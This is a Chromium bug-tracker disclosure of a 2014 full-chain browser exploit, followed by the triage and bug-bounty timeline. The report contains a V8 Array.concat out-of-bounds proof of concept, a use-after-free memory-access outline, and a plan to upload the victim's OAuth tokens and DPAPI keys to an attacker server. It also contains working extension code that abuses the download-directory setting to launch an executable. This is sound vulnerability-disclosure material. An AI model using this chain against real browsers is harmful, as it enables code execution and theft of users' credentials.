# Full chain exploit + sandbox escape: Array.concat -> extension install -> download exec

| Field | Value |
|-------|-------|
| **Issue ID** | [40079775](https://issues.chromium.org/issues/40079775) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Internals |
| **Reporter** | lk...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2014-06-20 |
| **Bounty** | $30,000.00 |

## Description

**VULNERABILITY DETAILS**  

= Out-of-bounds access vulnerability in Array.concat()

I use a bug in Array.concat() to execute arbitraty code in a sandbox.

---

v8/src/runtime.cc [1]  

RUNTIME\_FUNCTION(Runtime\_ArrayConcat) {  

HandleScope handle\_scope(isolate);  

ASSERT(args.length() == 1);

CONVERT\_ARG\_HANDLE\_CHECKED(JSArray, arguments, 0);  

int argument\_count = static\_cast<int>(arguments->length()->Number());  

RUNTIME\_ASSERT(arguments->HasFastObjectElements());  

Handle<FixedArray> elements(FixedArray::cast(arguments->elements()));

// Pass 1: estimate the length and number of elements of the result.  

// The actual length can be larger if any of the arguments have getters  

// that mutate other arguments (but will otherwise be precise).  

// The number of elements is precise if there are no inherited elements.

ElementsKind kind = FAST\_SMI\_ELEMENTS;

uint32\_t estimate\_result\_length = 0;  

uint32\_t estimate\_nof\_elements = 0;  

for (int i = 0; i < argument\_count; i++) {  

HandleScope loop\_scope(isolate);  

Handle<Object> obj(elements->get(i), isolate);  

uint32\_t length\_estimate;  

uint32\_t element\_estimate;  

if (obj->IsJSArray()) {  

Handle<JSArray> array(Handle<JSArray>::cast(obj));  

length\_estimate = static\_cast<uint32\_t>(array->length()->Number()); <<<<< <https://crbug.com/chromium/386988#c1>. This is first time, reference a length field of array.  

if (length\_estimate != 0) {  

ElementsKind array\_kind =  

GetPackedElementsKind(array->map()->elements\_kind());  

if (IsMoreGeneralElementsKindTransition(kind, array\_kind)) {  

kind = array\_kind;  

}  

}  

element\_estimate = EstimateElementCount(array);  

} else {  

if (obj->IsHeapObject()) {  

if (obj->IsNumber()) {  

if (IsMoreGeneralElementsKindTransition(kind, FAST\_DOUBLE\_ELEMENTS)) {  

kind = FAST\_DOUBLE\_ELEMENTS;  

}  

} else if (IsMoreGeneralElementsKindTransition(kind, FAST\_ELEMENTS)) {  

kind = FAST\_ELEMENTS;  

}  

}  

length\_estimate = 1;  

element\_estimate = 1;  

}  

// Avoid overflows by capping at kMaxElementCount.  

if (JSObject::kMaxElementCount - estimate\_result\_length <  

length\_estimate) {  

estimate\_result\_length = JSObject::kMaxElementCount;  

} else {  

estimate\_result\_length += length\_estimate; <<<<< <https://crbug.com/chromium/386988#c2>. length\_estimate, which is initialized in [https://crbug.com/chromium/386988#c1], is added to estimate\_result\_length.

```
}  
if (JSObject::kMaxElementCount - estimate_nof_elements <  
    element_estimate) {  
  estimate_nof_elements = JSObject::kMaxElementCo     unt;  
} else {  
  estimate_nof_elements += element_estimate;  
}  

```

}

...  

...

Handle<FixedArray> storage;  

if (fast\_case) {  

// The backing storage array must have non-existing elements to preserve  

// holes across concat operations.  

storage = isolate->factory()->NewFixedArrayWithHoles( <<<<< <https://crbug.com/chromium/386988#c3>. Create an array of size estimated\_result\_length.  

estimate\_result\_length);  

} else {  

// TODO(126): move 25% pre-allocation logic into Dictionary::Allocate  

uint32\_t at\_least\_space\_for = estimate\_nof\_elements +  

(estimate\_nof\_elements >> 2);  

storage = Handle<FixedArray>::cast(  

SeededNumberDictionary::New(isolate, at\_least\_space\_for));  

}

ArrayConcatVisitor visitor(isolate, storage, fast\_case);

for (int i = 0; i < argument\_count; i++) {  

Handle<Object> obj(elements->get(i), isolate);  

if (obj->IsJSArray()) {  

Handle<JSArray> array = Handle<JSArray>::cast(obj);  

if (!IterateElements(isolate, array, &visitor)) { <<<<< <https://crbug.com/chromium/386988#c4>. Call IterateElements()  

return isolate->heap()->exception();  

}  

} else {  

visitor.visit(0, obj);  

visitor.increase\_index\_offset(1);  

}  

}

## if (visitor.exceeds\_array\_limit()) { return isolate->Throw( \*isolate->factory()->NewRangeError("invalid\_array\_length", HandleVector<Object>(NULL, 0))); } return \*visitor.ToArray(); <<<<< <https://crbug.com/chromium/386988#c5>. ToArray() create a corrupted Array. }

Here is details on IterateElements() and ToArray().

---

v8/src/runtime.cc [1]

static bool IterateElements(Isolate\* isolate,  

Handle<JSArray> receiver,  

ArrayConcatVisitor\* visitor) {  

uint32\_t length = static\_cast<uint32\_t>(receiver->length()->Number()); <<<<< 4.1. This is second time, reference a length field of array.  

switch (receiver->GetElementsKind()) {  

...  

}  

visitor->increase\_index\_offset(length); <<<<<<<<<<  

return true;  

}

## void increase\_index\_offset(uint32\_t delta) { if (JSObject::kMaxElementCount - index\_offset\_ < delta) { index\_offset\_ = JSObject::kMaxElementCount; } else { index\_offset\_ += delta; <<<<<<<<< } }

---

## Handle<JSArray> ToArray() { Handle<JSArray> array = isolate\_->factory()->NewJSArray(0); Handle<Object> length = isolate\_->factory()->NewNumber(static\_cast<double>(index\_offset\_)); <<<<< 5.1. local variable length is initalized with member variable index\_offset\_. Handle<Map> map = JSObject::GetElementsTransitionMap( array, fast\_elements\_ ? FAST\_HOLEY\_ELEMENTS : DICTIONARY\_ELEMENTS); array->set\_map(\*map); array->set\_length(\*length); <<<<< array->set\_elements(\*storage\_); <<<<< 5.2. However, storage\_ is created with a size with [https://crbug.com/chromium/386988#c3]. return array; }

(I can't definitely sure whether those above analysis is accurate or not.)

## Here is proof-of-concept.

a = [1];  

b = [];  

a.**defineGetter**(0, function () {  

b.length = 0xffffffff;  

});

## c = a.concat(b); console.log(c);

= From out-of-bounds to code execution

Using out-of-bounds vulnerability in Array, attacker can trigger Use-after-free to execute code.

1. Create 2D Array, which contain corrupted Array(###) and normal Array(o), alternatively.

[###########][ o ][###########][ o ][###########][ o ][###########][ o ]  

2. free all normal Arrays(o) and 2D Array.  

3. reference freed normal array(o) by corrupted array(###).  

---------|  

[###########][ o ][###########][ o ][###########][ o ][###########][ o ]  

4. Memory is not entirely clear, even normal Array(o) was freed. So we can use it as normal object.  

5. Let an ArrayBuffer allocated on freed normal array(o) by creating many ArrayBuffer.  

6. Through freed normal Array(o), manipulate ArrayBuffer's property(byteLength, buffer address) to arbitrary memory access.

P.S. exploit is not optimized.

= Sandbox bypassing via chrome extension

Here, i describe exploit scenario and explain about sandbox escaping.

Step 0. Victim open a malicious web page(Exploit).  

Step 1. Exploit let victim download a html page which will be executed on file:// origin.  

Step 2. After triggerring code execution vulnerability, open the html page(html page on step 1) by NavigateContentWindow(It use same functionality of chrome.embeddedSearch.newTabPage.navigateContentWindow of chrome://newtab).  

Step 3. Because of origin is file://. Attacker can access local files(read). but due to SecurityOrigin, use code execution flaws to change SecurityOrigin.  

Step 4. Upload user's oauth token information (%localappdata%/Google/Chrome/User Data/Default/Web Data) to attacker's server.  

Step 5. From now on, we can synchronize Chrome with the user's token(i'm not sure that there is additional security mechanism on OAuth to synchronize chrome browser).  

Step 6. Install extension for at Synchronized chrome.  

Step 7. During synchronization a user's Chrome install extension, too.

[Step 4] may takes time. in case of windows, token file is encrypted with DPAPI.  

So, bruteforcing password for windows login is required to get a master key file at %appdata%/Microsoft/Protect/.

[Step 6] use some vulnerability(?) in extension to bypass sandbox.  

In chrome://settings-frame/settings, user can change download.default\_directory.  

Using chrome.downloads.showDefaultFolder(), chrome extension can open the directory on download.default\_directory.  

but it doesn’t check whether directory path is file or directory. (in case of file, Chrome execute it)  

So, malicious attacker can bypass sandbox by set download.default\_directory to an executable on external server(e.g. \host\hihi.exe) then call chrome.downloads.showDefaultFolder().

I use debugger for extension to run JavaScript on chrome://settings-frame/settings.  

In general, url start with chrome:// is not attachable. but simple tricks as following works.

view-source:chrome://settings-frame/settings  

about:settings-frame/settings

## Chrome extension code for sandbox escaping

function sleep(milliseconds) {  

var start = new Date().getTime();  

for (;;) {  

if ((new Date().getTime() - start) > milliseconds)  

break;  

}  

}

## chrome.tabs.create({url: "about:settings-frame/settings"}, function (tab) { chrome.debugger.attach({tabId: tab.id}, "1.0", function () { sleep(1000); chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.evaluate", {expression: 'old = document.getElementById("downloadLocationPath").value; chrome.send("setStringPref", ["download.default\_directory", "c:\\windows\\system32\\calc.exe"]);'}, function (o) { sleep(100); chrome.downloads.showDefaultFolder(); //open calc chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.evaluate", {expression: 'chrome.send("setStringPref", ["download.default\_directory", old]); window.close();'}); }); }); });

Tested on Windows 7

**VERSION**  

Chrome Version: 35.0.1916.153 stable  

Operating System: Windows 7

## Attachments

- [exploit.7z](attachments/exploit.7z) (application/octet-stream, 4.3 KB)

## Timeline

### js...@chromium.org (2014-06-20)

I need to verify this and break it out into separate bugs, but here's the individual bugs I see on my first pass:

1. V8 has an unprotected getter for Array.length()
2. 1993 introduced a web -> file: navigation bypass
3. Sync still allows silent extension installs (they know, maybe https://crbug.com/chromium/50275)
4. Extension can silently debug chrome pages (maybe related to https://crbug.com/chromium/367567)
5. The default download location can be set to an exe (see DownloadPathIsDangerous), which will be shell exec'd on an opening the downloads "folder".


### js...@chromium.org (2014-06-20)

Changing the name and adding CCs for the different areas, which I will break out into their own bugs shortly.

Heads up to the CCs. Since this is a full web to unsandboxed code exploit we will want to break as many links in the chain as we can for the next stable push.

Minor logistical note: I'm setting severity-critical but impact-none, since this is an umbrella bug and the breakout bugs will have the immediate impact and severity.


### js...@chromium.org (2014-06-20)

[Empty comment from Monorail migration]

### js...@chromium.org (2014-06-20)

[Comment Deleted]

### cl...@chromium.org (2014-06-20)

[Empty comment from Monorail migration]

### [Deleted User] (2014-06-20)

[Empty comment from Monorail migration]

### js...@chromium.org (2014-06-20)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-06-20)

[Empty comment from Monorail migration]

### pa...@chromium.org (2014-06-20)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-06-20)

[Empty comment from Monorail migration]

### na...@chromium.org (2014-06-20)

Adding kmadhusu@chromium.org, who is working on fixing https://crbug.com/chromium/387033.

### ti...@chromium.org (2014-06-20)

The current M36 beta build is likely to be promoted to stable, pushing the week of 14 July (at this stage, Tuesday 15 July).

Although this is tagged as critical and affects current stable, if there's no indication that this is being actively exploited, I recommend that we patch this into the M36 beta and then let it roll out in the first M36 release in a few weeks time.

### js...@chromium.org (2014-06-20)

One last thing that really worries me is that we have fully privileged oauth tokens sitting unencrypted in "Web Data".

rogerta@ tim@ - Any idea what the deal is with that?

### mi...@chromium.org (2014-06-20)

courage@: see #13, consider same for chrome.identity

### js...@chromium.org (2014-06-20)

I skimmed the exploit too fast. He's grabbing the local DPAPI keys out of the user profile (since he can read the file-system already via the file: URL navigations). Then he uploads the recovery keys and the "Web Data" to his server, where I assume he does the decryption.

BIG GIANT WARNING:

DO NOT RUN THIS ON A PROFILE WITH ANY SENSITIVE DATA IN YOUR OS OR USER PROFILE. THE POC RELIES ON SENDING YOUR CHROME PROFILE AND OS CRYPTO KEYS TO A REMOTE SERVER FOR DECRYPTION.

Hopefully everyone already knows better, but I just want to be safe.


### cl...@chromium.org (2014-06-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-06-22)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-06-23)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-06-23)

meacer@: Can you please take a look or find someone else to own it.

- Your friendly ClusterFuzz

### in...@chromium.org (2014-06-23)

[Empty comment from Monorail migration]

### rs...@chromium.org (2014-06-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-06-25)

[Empty comment from Monorail migration]

### js...@chromium.org (2014-06-25)

Fixing the flags to get this off the triage list and stop the nags.

### cl...@chromium.org (2014-06-25)

jln: Can you please take a look or find someone else to own it.

You are auto-assigned this issue since you are the top fixer for area label 'Cr-Internals-Sandbox'.

- Your friendly ClusterFuzz

### in...@chromium.org (2014-06-25)

We dont have meta label for exclusion yet in Sheriffbot

### js...@chromium.org (2014-06-25)

And Cr-Internals-Sandbox doesn't make sense here.

### cl...@chromium.org (2014-06-25)

[Empty comment from Monorail migration]

### rs...@chromium.org (2014-06-25)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-07-04)

inferno@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ti...@chromium.org (2014-07-07)

Spoke to jschuh@ offline - providing that https://crbug.com/chromium/387031 and https://crbug.com/chromium/387033 are fixed and land in M36, we should be okay for the other issues to land in a later M36 build.

https://crbug.com/chromium/387031 is fixed and merged to a version of V8 that will land with M36, so that's done.

https://crbug.com/chromium/387033 is fixed but requires merging. I'll chase that through to landing on M36.

### cl...@chromium.org (2014-07-12)

inferno@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ti...@chromium.org (2014-07-14)

lkhz49@ - Just letting you know that we're fixing the v8 component of this bug in the first v.36 release and hoping to address the other issues in later patches to v.36.

Once all of the bugs are fixed as part of the chain, we'll then take your bug to the reward panel and determine how much cash you should get for this submission.

Any questions or concerns, please update this bug. If you want to talk outside of the issue tracker, feel free to email me directly.

### cl...@chromium.org (2014-07-20)

inferno@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-07-22)

You have far exceeded the 30-day deadline for fixing this critical severity security vulnerability.

We commit ourselves to this deadline and appreciate your utmost priority on this issue.

If you are unable to look into this soon, please find someone else to own this.

- Your friendly ClusterFuzz

### js...@chromium.org (2014-07-22)

inferno@ - The sheriffbot is ignoring the Security_Impact-None label, because it shouldn't be nagging in that case.

### js...@chromium.org (2014-08-15)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-08-15)

You have far exceeded the 30-day deadline for fixing this critical severity security vulnerability.

We commit ourselves to this deadline and appreciate your utmost priority on this issue.

If you are unable to look into this soon, please find someone else to own this.

- Your friendly ClusterFuzz

### mb...@chromium.org (2014-08-22)

lkhz49@: How would you like to be credited when we mention this bug in our release notes? 

We should have an update for you on the reward for this in the next few days. Thanks again for the report!

### lk...@gmail.com (2014-08-22)

lokihardt@asrt
Use that. thanks :)

### pa...@chromium.org (2014-08-27)

[Empty comment from Monorail migration]

### mb...@chromium.org (2014-08-27)

Thanks again for the detailed report! This qualifies for a special $30000 reward.

Someone should be getting in touch with you soon with additional details, but please leave a comment here if you have any questions in the meantime.

### in...@chromium.org (2014-08-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-08-28)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-09-09)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-09-18)

lkhz49@: Sweet bug! Someone from our finance team should be reaching out to you for your details for payment. If you haven't heard from them in a week, please contact me directly.

### cl...@chromium.org (2014-12-04)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-06-25)

Processing via our e-payment system can take up to two weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### ju...@gmail.com (2018-02-12)

Could someone explain to me what this is exactly showing? I am new to the program and really have not quite understood anything about it. While I know alot about computers and such, This goes way over my understanding. 

Thank You.  

### rd...@chromium.org (2018-03-05)

[Empty comment from Monorail migration]

### is...@google.com (2018-03-05)

This issue was migrated from crbug.com/chromium/386988?no_tracker_redirect=1

[Monorail blocked-on: crbug.com/chromium/367567, crbug.com/chromium/387031, crbug.com/chromium/387033, crbug.com/chromium/387037, crbug.com/chromium/50275]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40079775)*
